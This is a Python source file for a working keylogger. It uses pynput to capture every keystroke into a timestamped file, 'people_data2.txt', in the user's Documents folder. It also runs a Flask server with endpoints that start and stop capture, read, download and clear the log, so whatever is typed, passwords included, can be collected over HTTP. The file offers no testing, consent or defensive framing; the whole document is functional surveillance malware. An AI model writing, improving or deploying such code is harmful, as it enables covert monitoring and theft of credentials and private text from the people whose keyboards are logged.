import os
import threading
import time
from datetime import datetime
from pynput import keyboard
from flask import Flask, request
from flask import send_file


# Log file in Documents folder
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
os.makedirs(documents_path, exist_ok=True)
people_file_path = os.path.join(documents_path, "people_data2.txt")

# Runtime state
capture_enabled = False
kill_switch = False
last_logged_minute = None
lock = threading.Lock()

app = Flask(__name__)

@app.route('/start', methods=['POST'])
def start_capture():
    global capture_enabled
    capture_enabled = True
    return "Capture started", 200

@app.route('/stop', methods=['POST'])
def stop_capture():
    global capture_enabled
    capture_enabled = False
    return "Capture stopped", 200

@app.route('/getpeople', methods=['GET'])
def get_people():
    try:
        with open(people_file_path, "r", encoding="utf-8") as f:
            return f.read(), 200
    except Exception as e:
        return f"Error reading log file: {e}", 500

def write_data(data):
    with lock:
        with open(people_file_path, "a", encoding="utf-8") as f:
            f.write(data)

def maybe_add_timestamp():
    global last_logged_minute
    now = datetime.now()
    current_minute = now.strftime('%Y-%m-%d %H:%M')
    if current_minute != last_logged_minute:
        last_logged_minute = current_minute
        timestamp = f"\n[TIMESTAMP] {now.strftime('%Y-%m-%d %H:%M:%S')}\n"
        write_data(timestamp)

def on_key_press(key):
    if not capture_enabled:
        return

    maybe_add_timestamp()

    try:
        key_str = key.char
    except AttributeError:
        key_str = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]"
        }.get(key, f"[{key.name.upper()}]")

    write_data(key_str)

def start_flask():
    app.run(port=5000, debug=False)

def start_keylogger():
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    return listener



@app.route('/download', methods=['GET'])
def download_log():
    try:
        return send_file(people_file_path, as_attachment=True)
    except Exception as e:
        return f"Error downloading file: {e}", 500


@app.route('/clear', methods=['POST'])
def clear_log():
    try:
        with lock:
            open(people_file_path, "w", encoding="utf-8").close()
        return "Log cleared", 200
    except Exception as e:
        return f"Error clearing log: {e}", 500
    

if __name__ == '__main__':
    print(f"[INFO] Agent running. Logging to: {people_file_path}")

    # Start Flask server in background
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()

    # Start keylogger
    listener = start_keylogger()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] CTRL+C detected. Stopping...")
        listener.stop()
        listener.join()
        print("[INFO] Agent stopped.")
